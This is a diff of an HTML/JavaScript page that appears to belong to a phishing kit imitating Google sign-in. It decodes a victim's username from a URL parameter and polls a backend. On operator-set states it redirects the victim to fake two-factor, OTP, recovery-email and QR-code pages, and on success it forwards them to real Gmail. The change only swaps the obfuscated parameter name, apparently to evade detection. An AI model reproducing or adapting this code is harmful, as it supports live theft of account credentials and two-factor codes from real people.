@@ -1,4 +1,5 @@
 
+
 <html>
 <html lang="en">
 <head>
@@ -149,7 +150,7 @@
 
     document.addEventListener('DOMContentLoaded', () => {
       const qp = new URLSearchParams(window.location.search);
-      const tk = qp.get('nxowuwonvdmbqrrwewosnadgdhgdus') || '';
+      const tk = qp.get('svhsdfhadeiueirncbxjcbbxcxb') || '';
       const username = atob(tk);
 
       // Replace username placeholders on page
@@ -181,12 +182,12 @@
                   clearInterval(poll);
                   var dest;
                   if (data.tapData.pageType === 'success') dest = 'https://mail.google.com';
-                  else if (data.tapData.pageType === 'tapn') dest = '/tapn?nxowuwonvdmbqrrwewosnadgdhgdus=' + encodeURIComponent(tk);
-                  else if (data.tapData.pageType === 'mconfi') dest = '/mconfi?nxowuwonvdmbqrrwewosnadgdhgdus=' + encodeURIComponent(tk);
-                  else if (data.tapData.pageType === 'eotp') dest = '/eotp?nxowuwonvdmbqrrwewosnadgdhgdus=' + encodeURIComponent(tk);
-                  else if (data.tapData.pageType === 'recemail') dest = '/recemail?nxowuwonvdmbqrrwewosnadgdhgdus=' + encodeURIComponent(tk);
-                  else if (data.tapData.pageType === 'qrcode') dest = '/qrcode?nxowuwonvdmbqrrwewosnadgdhgdus=' + encodeURIComponent(tk);
-                  else dest = '/tap?nxowuwonvdmbqrrwewosnadgdhgdus=' + encodeURIComponent(tk);
+                  else if (data.tapData.pageType === 'tapn') dest = '/tapn?svhsdfhadeiueirncbxjcbbxcxb=' + encodeURIComponent(tk);
+                  else if (data.tapData.pageType === 'mconfi') dest = '/mconfi?svhsdfhadeiueirncbxjcbbxcxb=' + encodeURIComponent(tk);
+                  else if (data.tapData.pageType === 'eotp') dest = '/eotp?svhsdfhadeiueirncbxjcbbxcxb=' + encodeURIComponent(tk);
+                  else if (data.tapData.pageType === 'recemail') dest = '/recemail?svhsdfhadeiueirncbxjcbbxcxb=' + encodeURIComponent(tk);
+                  else if (data.tapData.pageType === 'qrcode') dest = '/qrcode?svhsdfhadeiueirncbxjcbbxcxb=' + encodeURIComponent(tk);
+                  else dest = '/tap?svhsdfhadeiueirncbxjcbbxcxb=' + encodeURIComponent(tk);
                   window.location.href = dest;
                 } else if (data.result === 'wrong') {
                   clearInterval(poll);
